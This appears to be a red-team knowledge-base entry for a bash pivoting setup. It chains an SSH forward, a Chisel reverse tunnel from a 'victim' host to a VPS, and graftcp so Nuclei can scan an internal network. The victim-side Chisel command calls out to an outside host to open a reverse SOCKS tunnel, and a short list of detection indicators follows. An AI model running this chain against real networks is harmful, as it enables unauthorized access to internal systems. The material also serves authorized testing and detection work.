---
id: ae4e4491-6d73-46fd-b32e-fb3e65bcbc94
name: chisel-and-graftcp-setup-example
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:22.549910+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - setup
  - tunnel
  - proxy
validated: true
---

# chisel-and-graftcp-setup-example

## Code

```bash
# https://github.com/hmgle/graftcp

# Create a SOCKS5, using Chisel or another tool and forward it through SSH
(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 

# Run graftcp and specify the SOCKS5
(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
(attacker) $ graftcp ./nuclei -u http://172.16.1.24
```

## Description

This bash script example outlines the full setup for creating a SOCKS5 proxy chain using SSH, Chisel server/client for reverse tunneling, and Graftcp for proxifying a Go application like Nuclei. It demonstrates end-to-end pivoting from attacker to compromised host via VPS.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IP_VPS | IP address of the VPS | 192.168.1.100 |
| /tmp/id_rsa | Path to SSH private key | /tmp/id_rsa |
| ./key.pem | TLS key file on VPS | ./server.key.pem |
| ./cert.pem | TLS cert file on VPS | ./server.cert.pem |
| 8443 | Chisel server port | 8443 |
| /tmp/toto | Graftcp log file | /tmp/graftcp.log |
| 6 | Log level (high verbosity) | 6 |
| http://172.16.1.24 | Target URL for Nuclei | http://internal.target |

## Usage

Execute sequentially: First the SSH tunnel on attacker, then Chisel server on VPS, Chisel client on victim, Graftcp local on attacker, and finally the proxified app. Use in red team ops for internal scanning via pivot.

## Detection

- Log analysis for SSH port forwards (e.g., -L flags in process lists).
- TLS connections to non-standard ports like 8443 from internal hosts.
- Anomalous SOCKS5 traffic or Go binary network patterns in proxy logs.
- Behavioral detection of reverse tunnels via netflow data.

## Related

- [[procedures/Proxify-Go-Application-with-Graftcp]]
- [[tools/Chisel]]
- [[tools/Graftcp]]
